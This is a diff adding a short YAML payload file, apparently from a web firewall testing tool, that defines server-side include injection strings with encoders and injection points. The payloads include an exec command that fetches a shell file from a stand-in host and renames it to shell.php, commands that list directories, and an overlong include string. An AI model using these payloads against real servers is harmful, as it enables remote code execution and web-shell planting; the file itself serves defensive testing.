@@ -1,0 +1,17 @@
+---
+payload:
+  - '<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->'
+  - '<!--#echo var="DOCUMENT_URI" -->'
+  - '<!--#exec cmd="ls" -->'
+  - '<!--#exec cmd="dir" -->'
+  - '<!--#include file=”UUUUUUUU...UU”-->'
+encoder:
+  - Base64Flat
+  - URL
+placeholder:
+  - URLPath
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
+type: "SS Injection"
+...
